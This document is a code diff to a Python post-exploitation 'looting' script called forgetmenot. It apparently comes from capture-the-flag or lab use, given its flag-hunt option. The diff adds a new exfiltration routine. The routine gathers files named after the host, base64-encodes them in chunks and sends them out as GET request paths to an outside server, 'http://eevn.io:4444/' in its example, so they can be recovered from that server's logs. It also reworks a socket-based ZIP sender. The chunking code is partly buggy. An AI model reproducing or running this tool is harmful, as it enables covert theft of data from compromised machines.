@@ -1,4 +1,4 @@
-import re, sys, os, platform, socket, zipfile, time
+import re, sys, os, platform, socket, zipfile, time, urllib2, base64
 from subprocess import Popen, PIPE
 
 #
@@ -15,7 +15,7 @@ def mainmenu():
     try:
         mitem = None
         while mitem != 5:
-            print('\nforgetmenot looting script\nPlease make a selection.\n   1: Lootme\n   2: Exfil Options\n   3: Compression/ Encryption Options\n   4: Flag hunt\n   5: Exit')
+            print('\nforgetmenot looting script\nPlease make a selection.\n   1: Lootme\n   2: Exfil Options\n   3: Flag hunt\n   5: Exit')
             try:
                 mitem = input('fmn_$>')
             except SyntaxError:
@@ -27,9 +27,7 @@ def mainmenu():
                 outfiles = lootme_stub(outfiles)
             elif mitem == 2:    # exfil options
                 outfiles = exfil_options(outfiles)
-            elif mitem == 3:    # compression/ encryption options
-                print(3)
-            elif mitem == 4:    # flag hunt
+            elif mitem == 3:    # flag hunt
                 outfiles = flaghunt(outfiles)
             else:
                 print("Invalid Selection.")
@@ -415,36 +413,39 @@ def exfil_options(outfiles):
     try:
         mitem = None
         while mitem != 2:
-            print('\nExfil options:\n   1: send loot files to server\n   2: Back to main menu')
+            print('\nExfil options:\n   1: Send loot files to fmn_receiver\n   2: Send loot files as b64-encoded GET request(recover from server logs)\n   3: Back to main menu')
             try:
                 mitem = input('fmn_$>')
             except SyntaxError:
                 print('Syntax error.')
                 mitem = None
-            if mitem == 2:      # exit
+            if mitem == 3:      # exit
                 print('Exiting')
                 return
             elif mitem == 1:
-                send2srvr(outfiles)
+                send2srvrZip(outfiles)
+            elif mitem == 2:
+                send2srvrB64(outfiles)
             else:
                 mitem = None
                 print('Invalid selection.')
-    except:
+    except SyntaxError as e:
         print('Error. Returning to main menu.')
-        return
-    return
+        print(e)
+        return outfiles
+    return outfiles
 ### exfil options --end--
 
-### send to server --start--
-def send2srvr(outfiles):
+### send to fmn_receiver, ZIP --start--
+def send2srvrZip(outfiles):
     print('\nEnter port to connect to.')
-    port = input()
+    port = input('fmn_$>')
     sock = socket.socket()
     print('\nEnter server IP')
     if sys.version_info < (3,  0):
-        host = str(raw_input())
+        host = str(raw_input('fmn_$>'))
     elif sys.version_info > (3, 0):
-        host = str(input())
+        host = str(input('fmn_$>'))
     else:
         print('Invalid Python version detected!')
 
@@ -489,7 +490,65 @@ def send2srvr(outfiles):
             for i in sys.exc_info():
                 print(i)
     return outfiles
-### send to server --end--
+### send to fmn_receiver, ZIP --end--
+
+### send to server, b64 --start--
+def send2srvrB64(outfiles):
+    print('\nEnter full URL to send request to.\ne.g. "http://eevn.io:4444/"')
+    if sys.version_info < (3,  0):
+        url = str(raw_input('fmn_$>'))
+    elif sys.version_info > (3, 0):
+        url = str(input('fmn_$>'))
+    else:
+        print('Invalid Python version detected!')
+
+    files = os.listdir('./')
+    for f in files:
+        print(f)
+        regex_query = '^'+platform.uname()[1]+'_[.]*'
+        if re.search(regex_query, f) and f not in outfiles and not re.search('[.]*\.zip$', f):
+            outfiles.append(f)
+            print('Adding '+f+' to outfiles.')
+
+    for i in outfiles:
+        if i is not None:
+            with open(i) as inputFile:
+                print('sending '+i)
+                content = inputFile.readlines()
+        else:
+            continue
+        request_count = 1
+        lines = []
+        for line in content:
+            lines.append(line)
+            if len(lines) >=10:
+                payload = base64.standard_b64encode(''.join(lines))
+                try:
+                    urllib2.urlopen(url+'/'+str(request_count)+'/'+payload, timeout=1)
+                except socket.timeout:
+                    try:
+                        urllib2.urlopen(url+'/CLOSE', timeout=1)
+                    except urllib2.URLError:
+                        pass
+                    pass
+                print('Waiting for 5 seconds before sending chunk '+str(request_count)+'.')
+                time.sleep(5)
+
+                lines = []
+                request_count = request_count + 1
+        if len(lines) > 0:
+            payload = base64.standard_b64encode(lines)
+            try:
+                urllib2.urlopen(url+'/'+str(request_count)+'/'+payload, timeout=1)
+            except socket.timeout:
+                try:
+                    urllib2.urlopen(url+'/CLOSE', timeout=1)
+                except urllib2.URLError:
+                    pass
+                pass
+            print('File '+i+' sent.')
+    return
+### send to server, b64 --end--
 
 ### flag hunt --start--
 def flaghunt(outfiles):
